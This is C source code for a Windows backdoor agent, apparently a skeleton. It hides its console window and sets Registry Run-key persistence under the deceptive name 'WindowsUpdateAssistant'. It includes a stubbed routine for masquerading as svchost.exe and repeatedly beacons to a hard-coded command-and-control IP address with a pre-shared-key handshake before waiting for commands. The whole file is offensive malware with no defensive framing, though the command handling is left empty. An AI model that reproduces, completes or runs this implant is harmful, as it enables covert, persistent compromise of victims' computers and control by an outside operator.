#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "secur32.lib")

#define DEFAULT_C2_HOST "116.202.105.253"
#define DEFAULT_C2_PORT "8443"
#define AGENT_VERSION "v1.0.1-stable"

void masquerade() {
    // Basic masquerading by renaming current process or moving to system directory
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    // Logic to copy self to %TEMP% as svchost.exe would go here
}

void persistence() {
    // Basic Registry Run key persistence
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "WindowsUpdateAssistant", 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path));
    RegCloseKey(hKey);
}

int main(int argc, char *argv[]) {
    FreeConsole(); // Detach from console
    
    masquerade();
    persistence();

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    while (1) {
        struct addrinfo hints, *result = NULL;
        ZeroMemory(&hints, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;

        if (getaddrinfo(DEFAULT_C2_HOST, DEFAULT_C2_PORT, &hints, &result) != 0) {
            Sleep(10000);
            continue;
        }

        SOCKET connectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
        if (connectSocket == INVALID_SOCKET) {
            freeaddrinfo(result);
            Sleep(10000);
            continue;
        }

        if (connect(connectSocket, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
            closesocket(connectSocket);
            freeaddrinfo(result);
            Sleep(10000);
            continue;
        }

        freeaddrinfo(result);

        // PSK Handshake
        uint8_t psk[4] = {0x4F, 0x59, 0x45, 0x4E};
        send(connectSocket, (char*)psk, 4, 0);

        uint8_t ack = 0;
        if (recv(connectSocket, (char*)&ack, 1, 0) != 1 || ack != 1) {
            closesocket(connectSocket);
            Sleep(10000);
            continue;
        }

        // Connection established, proceed to TLS/Session handling...
        // For skeleton, we just loop and stay alive
        char buf[1024];
        while (recv(connectSocket, buf, sizeof(buf), 0) > 0) {
            // Heartbeat or command handling
        }

        closesocket(connectSocket);
        Sleep(5000);
    }

    WSACleanup();
    return 0;
}
